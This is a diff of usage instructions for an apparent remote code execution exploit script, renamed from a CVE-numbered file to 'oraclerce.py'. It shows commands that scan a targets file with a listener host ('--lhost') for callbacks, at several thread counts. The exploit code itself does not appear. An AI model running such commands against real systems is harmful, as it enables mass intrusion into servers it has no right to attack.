@@ -1,11 +1,11 @@
 Basic Scan
-python3 cve-2025-61882.py --targets targets.txt --lhost YOUR_VPS_IP
+python3 oraclerce.py --targets targets.txt --lhost IP
 
 Fast Scan (50 threads)
-python3 cve-2025-61882.py --targets targets.txt --lhost YOUR_VPS_IP --threads 50
+python3 oraclerce.py --targets targets.txt --lhost IP --threads 50
 
 Conservative Scan (10 threads)
-python3 cve-2025-61882.py --targets targets.txt --lhost YOUR_VPS_IP --threads 10
+python3 oraclerce.py --targets targets.txt --lhost IP --threads 10
 
 Configuration
 
